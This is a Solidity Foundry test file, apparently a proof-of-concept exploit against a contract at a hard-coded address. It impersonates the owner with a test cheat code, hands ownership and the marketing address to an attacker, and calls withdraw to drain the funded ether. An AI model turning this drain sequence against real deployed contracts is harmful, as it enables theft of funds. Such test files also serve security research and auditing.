// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INOMOS {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function setMarketingAddress(address _marketingAddress) external;
    function withdraw() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker = address(this);
    INOMOS victim = INOMOS(TARGET);
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        owner = victim.owner();
        // Fund victim contract so withdraw can extract value.
        vm.deal(TARGET, 5 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 attackerBefore = attacker.balance;

        vm.startPrank(owner);
        victim.transferOwnership(attacker);
        vm.stopPrank();

        victim.setMarketingAddress(attacker);
        victim.withdraw();

        assertGt(attacker.balance, attackerBefore, "Attacker did not gain native token");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

